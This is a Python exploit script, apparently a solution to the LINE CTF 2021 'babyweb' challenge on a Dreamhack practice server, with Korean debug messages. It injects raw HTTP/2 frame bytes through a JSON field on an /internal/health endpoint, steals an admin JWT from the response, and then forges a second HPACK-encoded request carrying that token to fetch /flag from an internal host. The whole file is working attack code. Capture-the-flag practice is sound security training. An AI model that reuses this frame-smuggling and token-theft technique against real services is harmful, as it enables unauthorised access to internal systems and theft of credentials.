import requests
import hpack
import struct
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 포트 번호 유지
BASE_URL = "http://host8.dreamhack.games:10378"
TARGET_URL = f"{BASE_URL.rstrip('/')}/internal/health"

print("="*75)
print("[DEBUG] EXPLOIT START: LINE CTF 2021 babyweb (Write-up Payload Applied)")
print("="*75)

def get_admin_token():
    print("\n[DEBUG] === [STEP 1] JWT 토큰 탈취 ===")
    print("[DEBUG] Write-up에서 추출한 Stage 1 하드코딩 바이트를 인젝션합니다.")
    
    # Write-up의 Stage 1 Payload (정확한 동적 테이블 인덱싱)
    frame_payload = b'\x00\x00\x06\x01\x05\x00\x00\x00\x05\x82\x87\xc2\xc0\xbf\xbe'
    
    payload = {
        "type": "2",
        "data": frame_payload.decode('latin-1')
    }
    
    try:
        print(f"[DEBUG] Payload injecting...")
        resp = requests.post(TARGET_URL, json=payload, headers={'Content-Type': 'application/json'}, timeout=15)
        raw_data = resp.content
        
        print(f"[DEBUG] HTTP Status Code: {resp.status_code}")
        
        # JWT 토큰 추출
        match = re.search(b'"token":"(.*?)"', raw_data)
        if match:
            token = match.group(1).decode('utf-8')
            print(f"[DEBUG] ✅ [SUCCESS] Token Extracted: {token[:20]}...[TRUNCATED]")
            return token
        else:
            print("[DEBUG] ❌ [FAIL] 토큰을 찾지 못했습니다. 버퍼 덤프를 확인하세요.")
            print(f"[DEBUG] Full Buffer Dump:\n{raw_data}")
            sys.exit(1)
            
    except Exception as e:
        print(f"[DEBUG] Exception in Step 1: {e}")
        sys.exit(1)

def get_flag(token):
    print("\n[DEBUG] === [STEP 2] 플래그 탈취 ===")
    print("[DEBUG] 획득한 토큰을 사용하여 GET /flag 요청 프레임을 생성합니다.")
    
    # 새로운 HTTP POST 요청이므로 연결이 새로 맺어집니다. 
    # 동적 테이블 충돌 위험이 없으므로 hpack 인코더를 그대로 사용하여 실제 토큰을 담습니다.
    encoder = hpack.Encoder()
    headers = [
        (':method', 'GET'),
        (':authority', 'babyweb_internal:8443'),
        (':scheme', 'https'),
        (':path', '/flag'),
        ('x-token', token)
    ]
    hpack_data = encoder.encode(headers)
    length = len(hpack_data)
    
    frame_header = struct.pack("!I", (length << 8) | 0x01) 
    flags = struct.pack("!B", 0x05) 
    sid_packed = struct.pack("!I", 5) 
    
    frame_payload = frame_header + flags + sid_packed + hpack_data
    
    payload = {
        "type": "2",
        "data": frame_payload.decode('latin-1') 
    }
    
    try:
        print("[DEBUG] Final payload injecting...")
        resp = requests.post(TARGET_URL, json=payload, headers={'Content-Type': 'application/json'}, timeout=15)
        raw_data = resp.content
        
        if b"flag" in raw_data.lower() or b"DH{" in raw_data:
            print("\n[DEBUG] 🎉 [SUCCESS] Flag captured!")
            print("="*75)
            print(f"[🔥 FLAG DATA 🔥]\n{raw_data.decode('utf-8', errors='ignore')}")
            print("="*75)
        else:
            print("[DEBUG] ❌ [FAIL] 플래그를 찾을 수 없습니다.")
            print(f"[DEBUG] Final Dump:\n{raw_data}")
            
    except Exception as e:
        print(f"[DEBUG] Exception in Step 2: {e}")

if __name__ == "__main__":
    admin_token = get_admin_token()
    get_flag(admin_token)